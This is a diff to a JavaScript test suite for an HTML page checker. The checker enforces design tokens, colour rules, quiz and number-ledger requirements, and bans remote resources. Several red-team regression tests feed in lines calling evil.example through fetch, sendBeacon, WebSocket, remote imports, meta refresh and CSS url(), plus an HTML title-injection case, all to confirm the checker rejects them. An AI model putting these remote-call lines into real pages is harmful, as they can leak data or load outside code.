@@ -1,6 +1,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { checkHtml, REGISTRY } from "../src/check.mjs";
+import { CANONICAL_TOKENS } from "../src/canonical-tokens.mjs";
 import { readFileSync } from "node:fs";
 import { fileURLToPath } from "node:url";
 import { dirname, join } from "node:path";
@@ -15,9 +16,7 @@ const goodPage = `<!DOCTYPE html>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>测试页</title>
 <style>
-/* aha-design-tokens v1 */
-:root { --bg: #171310; --accent: #ffb454; --t-1: #f5efe5; }
-.t-2 { color: var(--t-1); }
+${CANONICAL_TOKENS}
 </style>
 <style>
 .hero { border-color: var(--accent); }
@@ -70,7 +69,7 @@ test("tokens-present: missing marker fails", () => {
 });
 
 test("no-inline-colors: hex outside tokens block fails", () => {
-  const res = run(goodPage.replace("border-color: var(--accent);", "border-color: #ff0000;"));
+  const res = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: #ff0000; }"));
   assert.equal(gate(res, "no-inline-colors").status, "fail");
 });
 
@@ -90,7 +89,7 @@ test("no-inline-colors: href fragment '#top' is not a color (no false positive)"
 });
 
 test("no-inline-colors: rgb()/hsl() outside tokens block fails", () => {
-  const res = run(goodPage.replace("border-color: var(--accent);", "border-color: rgb(1,2,3);"));
+  const res = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: rgb(1,2,3); }"));
   assert.equal(gate(res, "no-inline-colors").status, "fail");
 });
 
@@ -174,9 +173,9 @@ test("B1: single-quoted and unquoted style/fill/class attributes are scanned", (
 });
 
 test("B2: 4/8-digit hex (#f00a, #ff0000aa) outside tokens block fails", () => {
-  const a = run(goodPage.replace("border-color: var(--accent);", "border-color: #f00a;"));
+  const a = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: #f00a; }"));
   assert.equal(gate(a, "no-inline-colors").status, "fail");
-  const b = run(goodPage.replace("border-color: var(--accent);", "border-color: #ff0000aa;"));
+  const b = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: #ff0000aa; }"));
   assert.equal(gate(b, "no-inline-colors").status, "fail");
 });
 
@@ -240,9 +239,14 @@ test("gate6/8 误判修复: url(#id) paint 引用 / module 顶层 await / import
   assert.equal(gate(b, "script-syntax").status, "pass");
   const c = run(goodPage.replace(
     "<script>const SIM_STEPS = []; const ok = 1;</script>",
-    '<script type="importmap">{"imports":{"x":"https://e.example/x.js"}}</script>'
+    '<script type="importmap">{"imports":{"x":"./local.js"}}</script>'
   ));
   assert.equal(gate(c, "script-syntax").status, "pass");
+  const d = run(goodPage.replace(
+    "<script>const SIM_STEPS = []; const ok = 1;</script>",
+    '<script type="importmap">{"imports":{"x":"https://e.example/x.js"}}</script>'
+  ));
+  assert.equal(gate(d, "script-syntax").status, "fail", "importmap 指向远程应拦");
 });
 
 test("gate6: 命名颜色字面量在 style 属性内被拦", () => {
@@ -262,7 +266,7 @@ test("gate 9-11: questioner-ref / fail-tag / zh sim-label gates", () => {
 });
 
 test("R-MINORS: named color in style block / single-quoted tag & k labels / ref in script ok", () => {
-  const a = run(goodPage.replace("border-color: var(--accent);", "border-color: crimson;"));
+  const a = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: crimson; }"));
   assert.equal(gate(a, "no-inline-colors").status, "fail");
   const b = run(goodPage.replace("<h2>节</h2>", "<div class='fail'><span class='tag'>坏料</span>x</div>"));
   assert.equal(gate(b, "fail-tag-consistency").status, "pass");
@@ -386,9 +390,9 @@ test("gate13 number-ledger: modulo operator (95 % 3 = 2, column header '% 4') is
   assert.equal(gate(res, "number-ledger").status, "pass", JSON.stringify(gate(res, "number-ledger")));
 });
 
-test("gate13 number-ledger: a percentage in a table cell followed by a number in the next row still counts", () => {
-  const body = `<table><tr><td>5</td><td>≈ 9.2%</td></tr><tr><td>10</td><td>≈ 0.82%</td></tr></table>`;
-  const res = run(fullPage(body, ledger(`<li data-kind="实算">0.82% — 公式</li>`)));
+test("gate13 number-ledger: percentage right before a number outside tables still counts (no modulo misread)", () => {
+  const body = `<p>命中率约 9.2%,详见下表。</p><table><tr><td>表格内 82% 豁免</td></tr></table>`;
+  const res = run(fullPage(body, ledger(`<li data-kind="实算">82% — 已豁免</li>`)));
   assert.equal(gate(res, "number-ledger").status, "fail");
   assert.match(gate(res, "number-ledger").detail, /9\.2%/);
 });
@@ -424,4 +428,190 @@ test("gate13 number-ledger: ×N in body also requires a ledger entry", () => {
   assert.equal(gate(res, "number-ledger").status, "fail");
   assert.match(gate(res, "number-ledger").detail, /8/);
   assert.equal(gate(run(fullPage(body, ledger(`<li data-kind="实算"><b>8 并发</b> — 压测</li>`))), "number-ledger").status, "pass");
+});
+
+// 数据表内百分数豁免(R6:整表索账曾与账本≤6条冲突)
+test("gate13 number-ledger: percentages inside <table> are exempt", () => {
+  const body = `<table><caption>伯克利 1973(出处:Bickel et al.)</caption><tr><td>A 系女 82%</td><td>B 系女 68%</td></tr></table><p>整体却反转。</p>`;
+  const res = run(fullPage(body, ledger("")));
+  assert.equal(gate(res, "number-ledger").status, "pass", JSON.stringify(gate(res, "number-ledger")));
+});
+test("gate13 number-ledger: percentages outside tables still count", () => {
+  const body = `<p>表外还有一句:整体低 4%。</p><table><tr><td>82%</td></tr></table>`;
+  const res = run(fullPage(body, ledger("")));
+  assert.equal(gate(res, "number-ledger").status, "fail");
+  assert.match(gate(res, "number-ledger").detail, /4%/);
+});
+
+// 红队场景:改低版本号 + 篡改色值也必须挂(无快照放行后门)
+test("gate5: downgraded version + tampered color fails (no snapshot backdoor)", async () => {
+  const { CANONICAL_TOKENS } = await import("../src/canonical-tokens.mjs");
+  const page = (css) => `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>t</title><style>${css}</style></head><body><h1>t</h1></body></html>`;
+  const evil = CANONICAL_TOKENS.replace(/v[\d.]+/, "v0.9").replace("#ffab2e", "#00ff00");
+  assert.equal(gate(run(page(evil)), "tokens-present").status, "fail");
+  // 注释差异容忍:仅注释不同、变量一致 → 过(旧页面升级兼容)
+  const commented = CANONICAL_TOKENS.replace("规则（SKILL.md 契约）：", "规则（本页样式契约,注释允许演化）：");
+  assert.equal(gate(run(page(commented)), "tokens-present").status, "pass");
+});
+
+// 内容页信号:整删第 7 层(takeaway/自测/账本)但保留 ≥3 节眉 → 门 12/13 必须挂
+test("gate12/13: deleting layer 7 entirely cannot dodge self-test/ledger gates", () => {
+  const layers = ["01", "02", "03"].map((n) => `<p class="eyebrow" data-n="${n}">层${n}</p><h2>标题${n}</h2><p>这一段内容足够充实,构成内容页信号。</p>`).join("\n");
+  const page = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>t</title>
+<style>${CANONICAL_TOKENS}</style></head><body><h1>t</h1>${layers}
+<p>正文出现 30% 的比例数字。</p></body></html>`;
+  const res = run(page);
+  assert.equal(gate(res, "self-test").status, "fail", "无自测块须挂");
+  assert.match(gate(res, "self-test").detail ?? "", /自测/);
+  assert.equal(gate(res, "number-ledger").status, "fail", "无账本须挂");
+});
+
+// 门9 扩充:「如你所问」等新短语必须挂
+test("gate9: expanded questioner references (如你所问/你提到的) fail", () => {
+  const a = run(goodPage.replace("<h2>节</h2>", "<h2>节</h2><p>如你所问,这就是答案。</p>"));
+  assert.equal(gate(a, "no-questioner-ref").status, "fail");
+  const b = run(goodPage.replace("<h2>节</h2>", "<h2>节</h2><p>你提到的那个问题稍后展开。</p>"));
+  assert.equal(gate(b, "no-questioner-ref").status, "fail");
+});
+
+// 红队四轮:oklch()/aqua 命名色逃逸(门6)
+test("gate6: oklch()/aqua/named-color escapes fail", () => {
+  const a = run(goodPage.replace(".hero", ".hero2").replace('<style>\n.hero2 { border-color: var(--accent); }', '<style>\n.hero2 { border-color: var(--accent); }\n.x1 { color: oklch(0.7 0.1 200); }\n.x2 { fill: aqua; }\n'));
+  // 直接构造更直接:
+  const page = goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: var(--accent); }\n.ok1 { color: oklch(0.7 0.1 200); }\n.ok2 { color: aqua; }");
+  const res = run(page);
+  assert.equal(gate(res, "no-inline-colors").status, "fail");
+  assert.match(gate(res, "no-inline-colors").detail ?? "", /oklch|aqua/);
+});
+
+// 红队四轮:tokens 块尾增补样式(门5 全等拦截)
+test("gate5: appending page styles inside tokens block fails", async () => {
+  const { CANONICAL_TOKENS } = await import("../src/canonical-tokens.mjs");
+  const page = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>t</title><style>${CANONICAL_TOKENS}\n.sneak { color: #ff00aa; }</style></head><body><h1>t</h1></body></html>`;
+  assert.equal(gate(run(page), "tokens-present").status, "fail");
+});
+
+// 红队四轮:门13 子串误配("95%" 不被 "195%" 满足)
+test("gate13: substring false-match (95% vs 195%) no longer satisfies", () => {
+  const body = `<p>误报率约 95%。</p>`;
+  const led = ledger(`<li data-kind="出处"><b>195%</b> — 另一个来源</li>`);
+  const res = run(fullPage(body, led));
+  assert.equal(gate(res, "number-ledger").status, "fail");
+  assert.match(gate(res, "number-ledger").detail ?? "", /95/);
+});
+
+// 红队四轮:module 脚本动态 import 远程模块(门8)
+test("gate8: dynamic remote import in module script fails", () => {
+  const page = goodPage.replace(
+    "<script>const SIM_STEPS = []; const ok = 1;</script>",
+    '<script type="module">const x = await import("https://evil.example/mod.js");</script>'
+  );
+  assert.equal(gate(run(page), "script-syntax").status, "fail");
+});
+
+// 红队四轮低档:门9「针对你的问题」/门13 全角数字
+test("gate9+13: 针对你的问题 / fullwidth ９５％ both caught", () => {
+  const a = run(goodPage.replace("<h2>节</h2>", "<h2>节</h2><p>针对你的问题,下面展开。</p>"));
+  assert.equal(gate(a, "no-questioner-ref").status, "fail");
+  const body = `<p>全角写的误报率约９５％。</p>`;
+  const res = run(fullPage(body, ledger("")));
+  assert.equal(gate(res, "number-ledger").status, "fail");
+});
+
+// 红队四轮中4:删 takeaway、改名 data-n,但内容体量大 → 门12/13 仍触发
+test("gate12/13: renaming data-n and dropping takeaway cannot dodge when body is substantial", () => {
+  const para = "这是一段有实质内容的长文,用来把正文体量推过内容页阈值,模拟真实六层图解页的文本量。".repeat(60);
+  const page = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>t</title>
+<style>${CANONICAL_TOKENS}</style></head><body><h1>t</h1><p>${para}</p>
+<p>正文出现 30% 的比例数字。</p></body></html>`;
+  const res = run(page);
+  assert.equal(gate(res, "self-test").status, "fail", "大体量页无自测须挂");
+  assert.equal(gate(res, "number-ledger").status, "fail", "大体量页无账本须挂");
+});
+
+// 红队五轮回归
+test("gate8: remote <link rel=stylesheet> and fetch() fail", () => {
+  const a = run(goodPage.replace("</head>", '<link rel="stylesheet" href="https://cdn.example/x.css"></head>'));
+  assert.equal(gate(a, "script-syntax").status, "fail");
+  const b = run(goodPage.replace("const ok = 1;", 'const ok = 1; fetch("https://evil.example/x").then(r=>r.json());'));
+  assert.equal(gate(b, "script-syntax").status, "fail");
+});
+
+test("gate12: answer-container li do not count as questions", () => {
+  const one = `<section class="section quiz" data-quiz><h2>测</h2><ol><li>唯一一问?</li></ol><button type="button" data-quiz-toggle>查看答案</button><div data-quiz-answers hidden><ul><li>答1</li><li>答2</li><li>答3</li></ul></div></section>`;
+  const res = run(fullPage("<p>无数字</p>", ledger("")).replace(/<section class="section quiz" data-quiz>[\s\S]*?<\/section>/, one));
+  assert.equal(gate(res, "self-test").status, "fail", "1 问+3 答案 li 不满足 ≥2 问");
+});
+
+test("gate12: page CSS un-hiding .quiz-ans fails", () => {
+  const page = goodPage.replace("<h3>小节</h3>", `<h3>小节</h3><div class="takeaway"><p><mark>记</mark></p></div>
+<section class="section quiz" data-quiz><h2>q</h2><ol><li>一?</li><li>二?</li></ol><button type="button" data-quiz-toggle>x</button><div data-quiz-answers hidden><p>a</p></div></section>`).replace("</head>", "<style>.quiz-ans{display:block!important}</style></head>");
+  const res = run(page);
+  assert.equal(gate(res, "self-test").status, "fail");
+});
+
+test("gate13: dimension notation 3×4 grid not treated as ×4 倍", () => {
+  const body = `<p>画一个 3 × 4 的网格来示意。</p>`;
+  const res = run(fullPage(body, ledger("")));
+  assert.equal(gate(res, "number-ledger").status, "pass");
+});
+
+// 红队六轮:标题注入(new 转义)、远程 img/url()、tag 多类名混排
+test("red6: new escapes HTML in title (no injection)", async () => {
+  const { spawnSync } = await import("node:child_process");
+  const { mkdtempSync } = await import("node:fs");
+  const { tmpdir } = await import("node:os");
+  const dir = mkdtempSync(join(tmpdir(), "aha-inj-"));
+  const r = spawnSync(process.execPath, [join(here, "../src/cli.mjs"), "new", "inj", 'X<h2>污染'], {
+    encoding: "utf8", env: { ...process.env, AHA_HOME: dir },
+  });
+  const page = readFileSync(join(dir, "inj.html"), "utf8");
+  assert.ok(!page.includes("<h1 class=\"display\">X<h2>"), "注入的 h2 必须被转义");
+  assert.ok(page.includes("&lt;h2&gt;"), "标题里的 <h2> 应以实体存在");
+});
+test("red6: remote <img src=https> and CSS url(https) fail gate8", () => {
+  const a = run(goodPage.replace("<h3>小节</h3>", '<h3>小节</h3><img src="https://evil.example/x.png" alt="远程">'));
+  assert.equal(gate(a, "script-syntax").status, "fail");
+  const b = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: var(--accent); background: url(https://evil.example/bg.png); }"));
+  assert.equal(gate(b, "script-syntax").status, "fail");
+});
+test("red6: gate10 catches tags with multiple class names", () => {
+  const page = goodPage.replace("<h3>小节</h3>", '<h3>小节</h3><div class="fails"><span class="tag pill">超长五字标签</span><span class="tag">误删</span></div>');
+  const res = run(page);
+  assert.equal(gate(res, "fail-tag-consistency").status, "fail");
+});
+
+// 红队七评:script 任意 URL 字面量 / 内联 style 展开 quiz / object/embed/@import 字符串 / meta refresh
+test("red7: URL literal in script by any API fails (ws/beacon/template-literal)", () => {
+  const variants = [
+    '<script>const ws = new WebSocket("wss://evil.example");</script>',
+    '<script>navigator.sendBeacon("https://evil.example/b");</script>',
+    '<script>fetch(`https://evil.example/x`);</script>',
+    '<script>const xhr = new XMLHttpRequest(); xhr.open("GET", "https://evil.example");</script>',
+    '<script type="module">import * as E from "https://evil.example/m.js";</script>',
+  ];
+  for (const v of variants) {
+    const page = goodPage.replace("<script>const SIM_STEPS = []; const ok = 1;</script>", v);
+    assert.equal(gate(run(page), "script-syntax").status, "fail", v.slice(0, 40));
+  }
+});
+test("red7: @import string form / object/embed / meta refresh fail", () => {
+  const a = run(goodPage.replace(".hero { border-color: var(--accent); }", '@import "https://evil.example/x.css";'));
+  assert.equal(gate(a, "script-syntax").status, "fail");
+  const b = run(goodPage.replace("<h3>小节</h3>", '<h3>小节</h3><object data="https://evil.example/o"></object>'));
+  assert.equal(gate(b, "script-syntax").status, "fail");
+  const c = run(goodPage.replace("</head>", '<meta http-equiv="refresh" content="0;url=https://evil.example"></head>'));
+  assert.equal(gate(c, "script-syntax").status, "fail");
+});
+test("red7: inline style un-hiding quiz answers fails", () => {
+  const page = goodPage
+    .replace("<h3>小节</h3>", `<h3>小节</h3><div class="takeaway"><p><mark>记</mark></p></div>
+<section class="section quiz" data-quiz><h2>q</h2><ol><li>一?</li><li>二?</li></ol><button type="button" data-quiz-toggle>x</button><div data-quiz-answers hidden style="display:block"><p>a</p></div></section>`);
+  assert.equal(gate(run(page), "self-test").status, "fail");
+});
+test("red7: h1 count ignores script string literals; simple class not sim-prefixed", () => {
+  const a = run(goodPage.replace("<h1 class=\"t-2\">标题</h1>", "<div class=\"t-2\">标题</div>").replace("const ok = 1;", 'const ok = 1; const s = "<h1>x</h1>";'));
+  assert.equal(gate(a, "single-h1").status, "fail", "真 h1 为 0(script 字符串不算)须挂");
+  const b = run(goodPage.replace("<h3>小节</h3>", '<h3 class="simple">小节</h3>'));
+  assert.equal(gate(b, "classes-known").status, "pass", "simple 不是 sim 前缀");
 });
